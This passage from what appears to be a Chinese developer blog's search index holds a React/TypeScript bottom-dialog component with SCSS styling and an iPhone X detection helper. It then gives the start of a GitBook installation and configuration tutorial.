punctuation">}</span><span class="token keyword">let</span> DialogDiv<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Dialog</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span><span class="token operator">&lt;</span>IAppProps<span class="token punctuation">,</span> IAppState<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">:</span> IAppProps<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            showToast<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            isIPhoneX<span class="token punctuation">:</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">componentWillMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> isIPhoneX <span class="token operator">=</span> <span class="token function">isIphoneX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            isIPhoneX        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> open <span class="token operator">=</span> <span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> <span class="token operator">...</span>props <span class="token punctuation">}</span> <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        DialogDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>DialogDiv<span class="token punctuation">)</span><span class="token punctuation">;</span>            ReactDOM<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>Dialog <span class="token punctuation">{</span><span class="token operator">...</span>props<span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">></span> <span class="token punctuation">,</span>DialogDiv<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ModalHelper<span class="token punctuation">.</span><span class="token function">afterOpen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    close <span class="token operator">=</span> <span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> param <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">{</span> result<span class="token punctuation">:</span> result <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            showToast<span class="token punctuation">:</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>DialogDiv<span class="token punctuation">)</span><span class="token punctuation">;</span>        ModalHelper<span class="token punctuation">.</span><span class="token function">beforeClose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> showToast<span class="token punctuation">,</span> isIPhoneX <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> title<span class="token punctuation">,</span> content<span class="token punctuation">,</span> btn <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>        <span class="token keyword">let</span> _twoBtn <span class="token operator">=</span> btn<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>                <span class="token attr-name">className</span><span class="token script language-javascript"><span class="token punctuation">=</span><span class="token punctuation">{</span><span class="token function">cs</span><span class="token punctuation">(</span><span class="token string">'dialog-container'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                    show<span class="token punctuation">:</span> showToast                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pay-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>new-dialog-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dialog-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token punctuation">{</span>title<span class="token punctuation">}</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dialog-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token punctuation">{</span>content<span class="token punctuation">}</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token script language-javascript"><span class="token punctuation">=</span><span class="token punctuation">{</span><span class="token function">cs</span><span class="token punctuation">(</span><span class="token string">'dialog-bottom flex'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> isIPhoneX<span class="token punctuation">:</span> isIPhoneX <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span>                            <span class="token punctuation">{</span>btn<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> idx<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                                <span class="token keyword">return</span> <span class="token punctuation">(</span>                                    <span class="token operator">&lt;</span>div                                        onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                                            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token comment" spellcheck="true">// item.callback();</span>                                        <span class="token punctuation">}</span><span class="token punctuation">}</span>                                        className<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">cs</span><span class="token punctuation">(</span><span class="token string">'dialog-btn'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                                            margin_r<span class="token punctuation">:</span> _twoBtn <span class="token operator">&amp;&amp;</span> idx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span>                                            <span class="token keyword">default</span><span class="token punctuation">:</span> _twoBtn <span class="token operator">&amp;&amp;</span> idx <span class="token operator">==</span> <span class="token number">0</span>                                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>                                        <span class="token punctuation">{</span>item<span class="token punctuation">.</span>text<span class="token punctuation">}</span>                                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                                <span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> Dialog<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css代码newDialog.scss</p><pre class="line-numbers language-css"><code class="language-css">$<span class="token property">baseFontSize</span><span class="token punctuation">:</span> <span class="token number">16</span>px !default<span class="token punctuation">;</span>// pixels to rems<span class="token atrule"><span class="token rule">@function</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span>$px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>    <span class="token atrule"><span class="token rule">@return</span> $px / $baseFontSize * 1rem<span class="token punctuation">;</span></span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.dialog-container</span> </span><span class="token punctuation">{</span>    <span class="token selector">position: fixed;    top: 0;    left: 0;    right: 0;    bottom: 0;    background: rgba(0, 0, 0, <span class="token class">.7</span>);    display: none;    z-index: 9999;    &amp;<span class="token class">.show</span> </span><span class="token punctuation">{</span>        <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.new-dialog-box</span> </span><span class="token punctuation">{</span>    <span class="token selector">width: 100%;    min-height: pxToRem(195px);    background: rgba(255, 255, 255, 1);    position: absolute;    box-sizing: border-box;    margin: 0;    bottom: 0;    z-index: 9999;    transition: all 0<span class="token class">.3s</span>;    border-radius: pxToRem(8px) pxToRem(8px) 0 0;    // display: flex;    <span class="token class">.dialog-title</span> </span><span class="token punctuation">{</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">19</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">25</span>px<span class="token punctuation">)</span> auto <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">25</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> PingFangSC-Medium, PingFang SC<span class="token punctuation">;</span>        <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">;</span>        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">51</span>, <span class="token number">51</span>, <span class="token number">51</span>, <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">19</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.dialog-content</span> </span><span class="token punctuation">{</span>        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">25</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">14</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> PingFangSC-Regular, PingFang SC<span class="token punctuation">;</span>        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">51</span>, <span class="token number">51</span>, <span class="token number">51</span>, <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">15</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">27</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">min-height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">50</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.dialog-bottom</span> </span><span class="token punctuation">{</span>        <span class="token selector">height: pxToRem(45px);        padding: 0 pxToRem(20px);        margin-bottom: pxToRem(15px);        display: flex;        &amp;<span class="token class">.isIPhoneX</span> </span><span class="token punctuation">{</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">49</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.dialog-btn</span> </span><span class="token punctuation">{</span>        <span class="token selector">// margin: 0 auto pxToRem(30px);        // width: pxToRem(300px);        flex: 1;        height: pxToRem(45px);        background-image: linear-gradient(-44deg, <span class="token id">#FCAF3C</span> 0%, <span class="token id">#F25228</span> 98%);        box-shadow: 0 8px 14px 0 rgba(190,118,22,0<span class="token class">.20</span>);        border-radius: pxToRem(45px);        text-align: center;        line-height: pxToRem(45px);        font-size: pxToRem(15px);        font-family: PingFangSC-Medium, PingFang SC;        color: rgba(255, 255, 255, 1);        &amp;<span class="token class">.margin_r</span> </span><span class="token punctuation">{</span>            <span class="token property">margin-right</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">24</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">&amp;<span class="token class">.default</span> </span><span class="token punctuation">{</span>            <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#FFFFFF</span><span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#E6E6E6</span><span class="token punctuation">;</span>            <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">10</span>px <span class="token number">20</span>px -<span class="token number">8</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">173</span>,<span class="token number">173</span>,<span class="token number">173</span>,<span class="token number">0.30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">45</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">15</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> PingFang-SC-Medium, PingFang-SC<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">85</span>, <span class="token number">85</span>, <span class="token number">85</span>, <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外附上代码中iPhone X系列机型判断方法</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">const</span> isIphoneX <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// iPhone X、iPhone XS</span>    <span class="token keyword">var</span> isIPhoneX <span class="token operator">=</span>        <span class="token regex">/iphone/gi</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">===</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">===</span> <span class="token number">375</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">===</span> <span class="token number">812</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// iPhone XS Max</span>    <span class="token keyword">var</span> isIPhoneXSMax <span class="token operator">=</span>        <span class="token regex">/iphone/gi</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">===</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">===</span> <span class="token number">414</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">===</span> <span class="token number">896</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// iPhone XR</span>    <span class="token keyword">var</span> isIPhoneXR <span class="token operator">=</span>        <span class="token regex">/iphone/gi</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">===</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">===</span> <span class="token number">414</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">===</span> <span class="token number">896</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isIPhoneX <span class="token operator">||</span> isIPhoneXSMax <span class="token operator">||</span> isIPhoneXR<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitbook使用及配置详解</title>
      <link href="2020/07/21/gitbook%E4%BD%BF%E7%94%A8%E5%8F%8A%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/07/21/gitbook%E4%BD%BF%E7%94%A8%E5%8F%8A%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装命令：1</p><blockquote><p>npm install -g gitbook-cli test</p></blockquote><p>安装完成之后，你可以使用下面的命令来检验是否安装成功。</p><pre class="line-numbers language-js"><code class="language-js">$ gitbook <span class="token operator">-</span>VCLI version<span class="token punctuation">:</span> <span class="token number">2.3</span><span class="token punctuation">.</span><span class="token number">2</span>GitBook version<span class="token punctuation">:</span> <span class="token number">3.2</span><span class="token punctuation">.</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li><p><code>初始化 gitbook init</code><br>GitBook 准备工作做好之后，我们进入一个你要写书的目录，输入如下命令。</p><pre class="line-numbers language-js"><code class="language-js">$ gitbook initwarn<span class="token punctuation">:</span> no summary file <span class="token keyword">in</span> <span class="token keyword">this</span> bookinfo<span class="token punctuation">:</span> create README<span class="token punctuation">.</span>mdinfo<span class="token punctuation">:</span> create SUMMARY<span class="token punctuation">.</span>mdinfo<span class="token punctuation">:</span> initialization is finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到他会创建 README.md 和 SUMMARY.md 这两个文件，README.md 应该不陌生，就是说明文档，而 SUMMARY.md 其实就是书的章节目录，其默认内容如下所</p><pre><code># Summary* [Introduction](README.md)</code></pre><p>如果已经初始化，直接启动即可</p></li><li><p><code>启动本地服务 gitboook serve</code><br>接下来，我们输入 <code>$ gitbook serve</code> 命令，然后在浏览器地址栏中输入 <code>http://localhost:4000</code></p></li><li><p>新建目录</p><p>首先我们来看一下gitbook目录结构及相关文件</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">.</span>├── book<span class="token punctuation">.</span>json├── README<span class="token punctuation">.</span>md├── SUMMARY<span class="token punctuation">.</span>md├── chapter<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">|</span>   ├── README<span class="token punctuation">.</span>md<span class="token operator">|</span>   └── something<span class="token punctuation">.</span>md└── chapter<span class="token number">-2</span><span class="token operator">/</span>    ├── README<span class="token punctuation">.</span>md    └── something<span class="token punctuation">.</span>md<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>book.json     </p><p>主要存放配置信息</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"collapsible-menu"</span><span class="token punctuation">,</span>    <span class="token string">"anchor-navigation-ex"</span><span class="token punctuation">,</span>    <span class="token string">"tbfed-pagefooter"</span><span class="token punctuation">,</span>    <span class="token string">"disqus"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">"发布业务逻辑梳理"</span><span class="token punctuation">,</span>  <span class="token string">"pluginsConfig"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token string">"tbfed-pagefooter"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>          <span class="token string">"copyright"</span><span class="token punctuation">:</span><span class="token string">"Copyright &amp;copy ershouche-FE 2019"</span><span class="token punctuation">,</span>          <span class="token string">"modify_label"</span><span class="token punctuation">:</span> <span class="token string">"文件修订时间："</span><span class="token punctuation">,</span>          <span class="token string">"modify_format"</span><span class="token punctuation">:</span> <span class="token string">"YYYY-MM-DD HH:mm:ss"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token string">"disqus"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"shortName"</span><span class="token punctuation">:</span> <span class="token string">"gitbookuse"</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SUMMARY.md  </p><p>Gitbook 的章节目录</p><pre class="line-numbers language-js"><code class="language-js"># Summary<span class="token operator">*</span> <span class="token punctuation">[</span>简介<span class="token punctuation">]</span><span class="token punctuation">(</span>README<span class="token punctuation">.</span>md<span class="token punctuation">)</span><span class="token operator">*</span> <span class="token punctuation">[</span>三端发布<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>publish<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>顶部提示<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>postprompt<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>真车发布<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>reallyCar<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>发布商业乐高业务<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>business<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>发布认证<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>certify<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>发布事后处理逻辑<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>success<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>发布水晶球<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>publish<span class="token operator">/</span>crystal<span class="token punctuation">.</span>md<span class="token punctuation">)</span><span class="token operator">*</span> <span class="token punctuation">[</span>车商通<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>cst<span class="token operator">/</span>cst<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>同步管理<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>cst<span class="token operator">/</span>sync<span class="token punctuation">.</span>md<span class="token punctuation">)</span>    <span class="token operator">*</span> <span class="token punctuation">[</span>联系人管理<span class="token punctuation">]</span><span class="token punctuation">(</span>docs<span class="token operator">/</span>cst<span class="token operator">/</span>sync<span class="token punctuation">.</span>md<span 